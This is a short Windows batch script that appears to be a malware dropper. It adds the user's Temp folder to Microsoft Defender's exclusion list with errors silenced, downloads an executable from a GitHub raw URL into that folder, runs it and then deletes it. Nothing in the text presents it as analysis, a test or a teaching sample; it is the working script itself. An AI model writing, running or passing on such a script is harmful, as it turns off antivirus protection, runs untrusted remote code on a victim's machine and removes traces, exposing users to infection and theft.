@echo off
set "TEMP=%USERPROFILE%\AppData\Local\Temp"
powershell -Command "Add-MpPreference -ExclusionPath \"%TEMP%\" -ErrorAction SilentlyContinue"
curl -L -o "%TEMP%\a.exe" "https://github.com/Nphuc1503/fffff/raw/refs/heads/main/nphuczz.exe"
start /wait "" "%TEMP%\a.exe"
del /f /q "%TEMP%\a.exe"
exit